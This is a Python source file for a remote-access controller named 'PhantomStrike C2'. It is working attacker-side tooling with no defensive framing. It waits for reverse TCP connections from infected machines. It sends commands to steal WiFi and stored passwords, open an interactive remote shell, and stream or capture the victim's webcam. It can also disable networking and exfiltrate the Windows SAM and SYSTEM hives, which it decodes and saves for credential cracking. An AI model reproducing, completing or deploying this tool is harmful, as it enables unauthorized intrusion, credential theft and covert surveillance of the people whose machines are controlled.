import os
import sys
import socket
import threading
import time
import json
import cv2
import numpy as np
import base64

# ======================================================
# LOAD CONFIG
# ======================================================
def load_config():
    try:
        config_path = os.path.join(os.getcwd(), 'config.json')
        with open(config_path, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(f"[-] Config load failed: {e}")
        print("[*] Using default config...")
        return {"C2_PORT": 4444, "C2_HOST": "0.0.0.0"}

config = load_config()
C2_PORT = config.get('C2_PORT', 4444)
C2_HOST = config.get('C2_HOST', '0.0.0.0')

# ======================================================
# MENU HIERARCHY
# ======================================================
menu_hierarchy = {
    "Main Menu": ["1. WiFi Attack", "2. Remote USB Attack", "3. C2 Settings", "4. Prank Features", "Exit"],
    "1. WiFi Attack": [
        "1.1 WiFi Scanner", 
        "1.2 WiFi Password Steal",
        "Back"
    ],
    "2. Remote USB Attack": [
        "2.1 Remote Data Collect", 
        "2.2 Remote Password Steal", 
        "2.3 Full System Info",
        "2.4 Remote Reverse Shell",
        "2.5 Lock Target Screen",
        "2.6 Open URL on Victim",
        "2.7 Show Hacked Message",
        "2.8 Disable Network (Wired/WiFi)",
        "2.9 Enable Network (Wired/WiFi)",
        "2.10 Capture Webcam",
        "2.11 Start Webcam Stream",
        "2.12 Stop Webcam Stream",
        "2.13 Extract SAM",
        "2.14 Extract SYSTEM",
        "Back"
    ],
    "3. C2 Settings": ["3.1 Target Info", "3.2 Connection Status", "Back"],
    "4. Prank Features": [
        "4.1 Play Voice Message",
        "4.2 Show Full Screen Notification",
        "4.3 Close Notification",
        "Back"
    ]
}

# ======================================================
# GLOBAL VARIABLES
# ======================================================
current_menu = "Main Menu"
selected_index = 0
target_connection = None
target_address = None
cached_fingerprint = {}
connection_lock = threading.Lock()

# Webcam Stream
stream_receiver_thread = None
stream_active = False
stream_window_name = "📡 Live Webcam Stream"
stream_client = None

# ======================================================
# WEBCAM STREAM RECEIVER
# ======================================================
def receive_webcam_stream():
    global stream_active, stream_client, target_address
    try:
        if not target_address:
            print("[!] No target connected. Cannot start stream receiver.")
            return
            
        victim_ip = target_address[0]
        print(f"[*] Connecting to webcam stream at {victim_ip}:8080...")
        
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(5)
        client.connect((victim_ip, 8080))
        print(f"📡 Connected to webcam stream server at {victim_ip}:8080")
        stream_client = client
        stream_active = True
        
        cv2.namedWindow(stream_window_name, cv2.WINDOW_NORMAL)
        cv2.resizeWindow(stream_window_name, 800, 600)
        cv2.moveWindow(stream_window_name, 100, 50)
        
        data = b""
        frame_count = 0
        fps_start_time = time.time()
        fps = 0
        frame = None
        paused = False
        
        print("\n" + "="*50)
        print("🎥 WEBCAM STREAM CONTROLS:")
        print("  'q' - Stop stream")
        print("  'f' - Toggle Fullscreen")
        print("  's' - Save Screenshot")
        print("  'Space' - Pause/Resume")
        print("  'r' - Reset Window Size")
        print("  'h' - Show Help")
        print("="*50 + "\n")
        
        while stream_active:
            try:
                key = cv2.waitKey(1) & 0xFF
                
                if key == ord('q'):
                    print("[*] Stopping stream (user requested)")
                    stream_active = False
                    break
                elif key == ord('f'):
                    cv2.setWindowProperty(stream_window_name, 
                                        cv2.WND_PROP_FULLSCREEN, 
                                        cv2.WINDOW_FULLSCREEN)
                    print("[*] Fullscreen toggled")
                elif key == ord('s'):
                    if frame is not None:
                        timestamp = time.strftime("%Y%m%d_%H%M%S")
                        screenshot_path = f"webcam_screenshot_{timestamp}.jpg"
                        cv2.imwrite(screenshot_path, frame)
                        print(f"📸 Screenshot saved: {screenshot_path}")
                    else:
                        print("[!] No frame to save")
                elif key == ord(' '):
                    paused = not paused
                    print(f"[*] Stream {'Paused' if paused else 'Resumed'}")
                elif key == ord('r'):
                    cv2.resizeWindow(stream_window_name, 800, 600)
                    print("[*] Window reset to 800x600")
                elif key == ord('h'):
                    print("\n" + "="*50)
                    print("🎥 WEBCAM STREAM CONTROLS:")
                    print("  'q' - Stop stream")
                    print("  'f' - Toggle Fullscreen")
                    print("  's' - Save Screenshot")
                    print("  'Space' - Pause/Resume")
                    print("  'r' - Reset Window Size")
                    print("  'h' - Show this help")
                    print("="*50 + "\n")
                
                if paused:
                    time.sleep(0.1)
                    continue
                
                size_data = client.recv(10)
                if not size_data:
                    print("[!] Stream ended by server")
                    break
                    
                try:
                    size = int(size_data.decode().strip())
                except ValueError:
                    continue
                
                frame_data = b""
                while len(frame_data) < size:
                    chunk = client.recv(min(4096, size - len(frame_data)))
                    if not chunk:
                        break
                    frame_data += chunk
                
                if len(frame_data) >= size:
                    img = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
                    if img is not None:
                        frame = img.copy()
                        frame_count += 1
                        
                        if frame_count % 10 == 0:
                            elapsed = time.time() - fps_start_time
                            fps = 10 / elapsed if elapsed > 0 else 0
                            fps_start_time = time.time()
                        
                        cv2.putText(img, f"FPS: {fps:.1f}", (10, 30), 
                                   cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0, 255, 0), 2)
                        cv2.putText(img, f"Target: {victim_ip}", (10, 60), 
                                   cv2.FONT_HERSHEY_SIMPLEX, 0.6, (255, 255, 0), 2)
                        cv2.putText(img, f"Frame: {frame_count}", (10, 90), 
                                   cv2.FONT_HERSHEY_SIMPLEX, 0.5, (255, 255, 255), 1)
                        
                        if paused:
                            cv2.putText(img, "⏸ PAUSED", (img.shape[1]//2 - 100, img.shape[0]//2), 
                                       cv2.FONT_HERSHEY_SIMPLEX, 2, (0, 0, 255), 4)
                        
                        cv2.putText(img, "q:Stop | f:Fullscreen | s:Screenshot | Space:Pause | r:Reset | h:Help", 
                                   (10, img.shape[0] - 10), cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 0, 255), 1)
                        
                        cv2.imshow(stream_window_name, img)
                        
            except socket.timeout:
                continue
            except ConnectionResetError:
                print("[!] Connection reset by peer. Stream stopped.")
                break
            except Exception as e:
                print(f"⚠️ Stream receive error: {e}")
                break
                
    except ConnectionRefusedError:
        print("[!] Connection refused! Make sure victim's stream server is running")
        print(f"💡 Victim IP: {target_address[0] if target_address else 'Unknown'}")
    except socket.timeout:
        print("[!] Connection timeout. Victim may not be reachable.")
    except Exception as e:
        print(f"⚠️ Stream receive error: {e}")
    finally:
        stream_active = False
        cv2.destroyAllWindows()
        if stream_client:
            try:
                stream_client.close()
            except:
                pass
        stream_client = None
        print("📡 Stream receiver stopped")

def start_stream_receiver():
    global stream_receiver_thread, stream_active
    if stream_receiver_thread is None or not stream_receiver_thread.is_alive():
        stream_active = True
        stream_receiver_thread = threading.Thread(target=receive_webcam_stream, daemon=True)
        stream_receiver_thread.start()
        print("[*] Webcam stream receiver started")
        print("📌 Controls in stream window:")
        print("   'q' - Stop stream")
        print("   'f' - Toggle fullscreen")
        print("   's' - Save screenshot")
        print("   'Space' - Pause/Resume")
        print("   'r' - Reset window size")
        print("   'h' - Show help")
    else:
        print("[!] Stream receiver already running")

def stop_stream_receiver():
    global stream_active, stream_client
    if stream_active:
        stream_active = False
        time.sleep(1)
        if stream_client:
            try:
                stream_client.close()
            except:
                pass
        stream_client = None
        cv2.destroyAllWindows()
        print("[*] Webcam stream receiver stopped")
    else:
        print("[!] No active stream to stop")

# ======================================================
# C2 LISTENER
# ======================================================
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def start_c2_listener():
    global target_connection, target_address, cached_fingerprint
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.settimeout(1)
    try:
        server.bind(("0.0.0.0", C2_PORT))
        server.listen(5)
        print(f"[+] C2 Listener started on port {C2_PORT}")
        
        while True:
            try:
                conn, addr = server.accept()
                conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                
                with connection_lock:
                    if target_connection:
                        try:
                            target_connection.close()
                        except:
                            pass
                    target_connection = conn
                    target_address = addr
                
                try:
                    conn.send(b"FETCH:FINGERPRINT")
                    raw_data = conn.recv(1024).decode('utf-8')
                    cached_fingerprint = json.loads(raw_data)
                    print(f"\n[+] Target connected from {addr[0]}:{addr[1]}")
                    print(f"[+] Hostname: {cached_fingerprint.get('hostname', 'Unknown')}")
                    print(f"[+] Username: {cached_fingerprint.get('username', 'Unknown')}")
                except Exception as e:
                    print(f"[-] Fingerprint fetch failed: {e}")
                    cached_fingerprint = {}
                    with connection_lock:
                        target_connection = None
                        target_address = None
            except socket.timeout:
                continue
    except Exception as e:
        print(f"[-] Listener error: {e}")

# ======================================================
# HANDLE SAM FILE
# ======================================================
def handle_sam_file(response):
    try:
        if response.startswith("SAM_FILE:"):
            encoded = response.split(":", 1)[1].strip()
            
            missing_padding = len(encoded) % 4
            if missing_padding:
                encoded += '=' * (4 - missing_padding)
            
            file_data = base64.b64decode(encoded)
            save_path = os.path.join(os.getcwd(), "SAM.hive")
            
            with open(save_path, 'wb') as f:
                f.write(file_data)
            
            print(f"\n[+] SAM extracted successfully!")
            print(f"[+] Saved to: {save_path}")
            print(f"[+] File size: {len(file_data) / 1024:.2f} KB")
            return True
        return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

# ======================================================
# HANDLE SYSTEM FILE
# ======================================================
def handle_system_file(response):
    try:
        if response.startswith("SYSTEM_FILE:"):
            encoded = response.split(":", 1)[1].strip()
            
            missing_padding = len(encoded) % 4
            if missing_padding:
                encoded += '=' * (4 - missing_padding)
            
            file_data = base64.b64decode(encoded)
            save_path = os.path.join(os.getcwd(), "SYSTEM.hive")
            
            with open(save_path, 'wb') as f:
                f.write(file_data)
            
            print(f"\n[+] SYSTEM extracted successfully!")
            print(f"[+] Saved to: {save_path}")
            print(f"[+] File size: {len(file_data) / 1024:.2f} KB")
            return True
        return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

# ======================================================
# SEND COMMAND
# ======================================================
def send_c2_command(cmd_string):
    global target_connection, target_address, cached_fingerprint
    
    with connection_lock:
        if not target_connection:
            print("[!] No remote target node is currently connected.")
            return False
    
    try:
        target_connection.settimeout(1)
        try:
            while True:
                junk = target_connection.recv(1024)
                if not junk:
                    break
        except socket.timeout:
            pass
        target_connection.settimeout(None)
        
        target_connection.send(cmd_string.encode('utf-8'))
        target_connection.settimeout(60)
        raw_response = target_connection.recv(8192).decode('utf-8')
        target_connection.settimeout(None)
        
        clean_response = raw_response.strip()
        
        if clean_response:
            if clean_response.startswith("SAM_FILE:"):
                handle_sam_file(clean_response)
            elif clean_response.startswith("SYSTEM_FILE:"):
                handle_system_file(clean_response)
            else:
                print(f"\n[+] Execution Response from Target:\n{clean_response}")
        else:
            print("\n[+] Command executed successfully (no response data).")
        return True
    except socket.timeout:
        print("[!] Command timeout - victim may be busy or disconnected")
        with connection_lock:
            target_connection = None
            target_address = None
            cached_fingerprint = {}
        return False
    except Exception as e:
        print(f"[!] Error transmitting payload instruction: {e}")
        with connection_lock:
            target_connection = None
            target_address = None
            cached_fingerprint = {}
        return False

# ======================================================
# DISPLAY MENU
# ======================================================
def display_menu():
    global current_menu, selected_index, target_connection, target_address, cached_fingerprint
    clear_screen()
    print("=" * 50)
    print("    🔥 PHANTOMSTRIKE REMOTE C2 INTERFACE    ")
    print(f"    Current Menu: {current_menu}")
    print("=" * 50)
    
    with connection_lock:
        if target_connection is not None:
            print(f" 🟢 STATUS: TARGET CONNECTED")
            if cached_fingerprint:
                print(f"    PC: {cached_fingerprint.get('hostname','Unknown')} | USER: {cached_fingerprint.get('username','Unknown')}")
                print(f"    MAC: {cached_fingerprint.get('mac_address','Unknown')}")
                print(f"    IP: {target_address[0] if target_address else 'Unknown'}")
        else:
            print(" 🔴 STATUS: WAITING FOR REMOTE AGENT BEACON...")
    print("=" * 50)
    
    items = menu_hierarchy[current_menu]
    for i, item in enumerate(items):
        if i == selected_index:
            print(f" -> [ {item} ] <- ")
        else:
            print(f"    {item}")
    print("=" * 50)
    print("(Use: 'w'=UP, 's'=DOWN, 'Enter'=SELECT)")

# ======================================================
# EXECUTE ACTION
# ======================================================
def execute_action(item):
    global current_menu, selected_index, target_connection, target_address, cached_fingerprint, stream_active
    
    if item == "Back":
        current_menu = "Main Menu"
        selected_index = 0
        return
    elif item in menu_hierarchy:
        current_menu = item
        selected_index = 0
        return
    elif item == "Exit":
        print("\nTerminating C2 Infrastructure...")
        with connection_lock:
            if target_connection:
                try: target_connection.close()
                except: pass
        cv2.destroyAllWindows()
        sys.exit()

    clear_screen()
    print(f"\n[!] Dispatched Node Command: {item}")
    print("-" * 50)
    
    # ========== WIFI ATTACKS ==========
    if item == "1.1 WiFi Scanner":
        send_c2_command("RUN:SCAN_WIFI")
    
    elif item == "1.2 WiFi Password Steal":
        send_c2_command("RUN:SCAN_WIFI_PASSWORDS")

    # ========== REMOTE USB ATTACKS ==========
    elif item == "2.1 Remote Data Collect":
        send_c2_command("RUN:COLLECT")
    
    elif item == "2.2 Remote Password Steal":
        send_c2_command("RUN:STEAL")
    
    elif item == "2.3 Full System Info":
        send_c2_command("RUN:SYS_INFO")

    elif item == "2.4 Remote Reverse Shell":
        with connection_lock:
            if not target_connection:
                print("[!] Execution Failure: No remote target node is currently connected.")
            else:
                try:
                    target_connection.settimeout(1)
                    try:
                        while True:
                            junk = target_connection.recv(1024)
                            if not junk:
                                break
                    except socket.timeout:
                        pass
                    target_connection.settimeout(None)
                    
                    target_connection.send(b"RUN:SHELL")
                    target_connection.settimeout(5)
                    
                    initial_resp = target_connection.recv(4096).decode('utf-8', errors='ignore')
                    print(initial_resp, end="")
                    
                    while True:
                        cmd_input = input()
                        
                        if not cmd_input.strip():
                            print("CMD> ", end="")
                            continue
                        
                        if cmd_input.strip().lower() == "exit_shell":
                            print("\n[*] Exiting remote interactive shell context...")
                            target_connection.send(b"exit_shell")
                            break
                        
                        target_connection.send(cmd_input.encode('utf-8'))
                        
                        response = b""
                        target_connection.settimeout(15)
                        while True:
                            try:
                                chunk = target_connection.recv(4096)
                                if not chunk:
                                    break
                                response += chunk
                                if b"CMD> " in chunk:
                                    break
                            except socket.timeout:
                                break
                        target_connection.settimeout(None)
                        
                        decoded = response.decode('utf-8', errors='ignore')
                        print(decoded, end="")
                        
                except Exception as e:
                    print(f"[!] Shell link lost during active session: {e}")
                    with connection_lock:
                        target_connection = None
                        target_address = None
                        cached_fingerprint = {}

    elif item == "2.5 Lock Target Screen":
        send_c2_command("RUN:LOCK_SCREEN")
    
    elif item == "2.6 Open URL on Victim":
        send_c2_command("RUN:OPEN_URL")
    
    elif item == "2.7 Show Hacked Message":
        send_c2_command("RUN:HACKED_MSG")
    
    elif item == "2.8 Disable Network (Wired/WiFi)":
        send_c2_command("RUN:DISABLE_NETWORK")
    
    elif item == "2.9 Enable Network (Wired/WiFi)":
        send_c2_command("RUN:ENABLE_NETWORK")
    
    elif item == "2.10 Capture Webcam":
        send_c2_command("RUN:WEBCAM")

    # ========== LIVE WEBCAM STREAM ==========
    elif item == "2.11 Start Webcam Stream":
        print("[*] Sending stream start command to victim...")
        success = send_c2_command("RUN:STREAM_START")
        if success:
            time.sleep(2)
            print("[*] Starting stream receiver on attacker panel...")
            start_stream_receiver()
        else:
            print("[!] Failed to start stream on victim")

    elif item == "2.12 Stop Webcam Stream":
        print("[*] Stopping stream receiver...")
        stop_stream_receiver()
        print("[*] Sending stream stop command to victim...")
        send_c2_command("RUN:STREAM_STOP")
        time.sleep(1)
        print("[+] Stream stopped successfully!")

    # ========== EXTRACT SAM ==========
    elif item == "2.13 Extract SAM":
        print("[*] Extracting SAM from victim...")
        print("[*] This may take a few moments...")
        send_c2_command("RUN:EXTRACT_SAM")
        input("\nPress Enter to return...")

    # ========== EXTRACT SYSTEM ==========
    elif item == "2.14 Extract SYSTEM":
        print("[*] Extracting SYSTEM from victim...")
        print("[*] This may take a few moments...")
        send_c2_command("RUN:EXTRACT_SYSTEM")
        input("\nPress Enter to return...")

    # ========== PRANK FEATURES ==========
    elif item == "4.1 Play Voice Message":
        send_c2_command("RUN:PLAY_VOICE")
    
    elif item == "4.2 Show Full Screen Notification":
        send_c2_command("RUN:PERSISTENT_NOTIFICATION")
    
    elif item == "4.3 Close Notification":
        send_c2_command("RUN:CLOSE_NOTIFICATION")

    # ========== C2 SETTINGS ==========
    elif item == "3.1 Target Info":
        with connection_lock:
            if target_connection and cached_fingerprint:
                print("=" * 50)
                print("         COMPROMISE NODE METRICS         ")
                print("=" * 50)
                print(f"[+] Victim Hostname  : {cached_fingerprint.get('hostname')}")
                print(f"[+] Active OS User   : {cached_fingerprint.get('username')}")
                print(f"[+] Hardware MAC     : {cached_fingerprint.get('mac_address')}")
                if target_address:
                    print(f"[+] Tunnel IP Link   : {target_address[0]}")
                    print(f"[+] Tunnel Port Lease: {target_address[1]}")
                print("=" * 50)
            else:
                print("[-] Link Offline: No target host data stream currently cached.")
            
    elif item == "3.2 Connection Status":
        print("=" * 50)
        print("        C2 SERVICE INFRASTRUCTURE        ")
        print("=" * 50)
        print(f"[*] Server Listening Port : {C2_PORT}")
        print("[*] Bound Subnet Context  : All Interfaces (0.0.0.0)")
        print("[*] Protocol Engine       : Reverse TCP Socket Connection")
        with connection_lock:
            if target_connection:
                print(" 🟢 Status                : Active Client Channel Linked")
            else:
                print(" 🔴 Status                : Idle (Listening for Beacons...)")
        print("=" * 50)

    input("\nPress Enter to return to the control menu...")

# ======================================================
# MAIN
# ======================================================
def main():
    global current_menu, selected_index
    
    print("""
    ╔═══════════════════════════════════════════╗
    ║     PHANTOMSTRIKE C2 CONTROLLER v2.0     ║
    ║     Remote Access & Surveillance Suite   ║
    ╚═══════════════════════════════════════════╝
    """)
    print("[*] Starting C2 Listener...")
    
    listener_thread = threading.Thread(target=start_c2_listener, daemon=True)
    listener_thread.start()
    
    time.sleep(2)
    print("[*] C2 Interface ready!")
    print("[*] Waiting for targets to connect...")
    print("[*] Press Ctrl+C to exit\n")
    
    try:
        while True:
            display_menu()
            user_input = input("\nC2 Input: ").lower().strip()
            items = menu_hierarchy[current_menu]
            
            if user_input == 'w':
                selected_index = (selected_index - 1) % len(items)
            elif user_input == 's':
                selected_index = (selected_index + 1) % len(items)
            elif user_input == '' or user_input == 'enter':
                execute_action(items[selected_index])
            elif user_input == 'q' and stream_active:
                print("[*] Stopping stream...")
                stream_active = False
                cv2.destroyAllWindows()
    except KeyboardInterrupt:
        print("\n\n[*] Shutting down C2 Interface...")
        cv2.destroyAllWindows()
        with connection_lock:
            if target_connection:
                try:
                    target_connection.close()
                except:
                    pass
        sys.exit()

if __name__ == "__main__":
    main()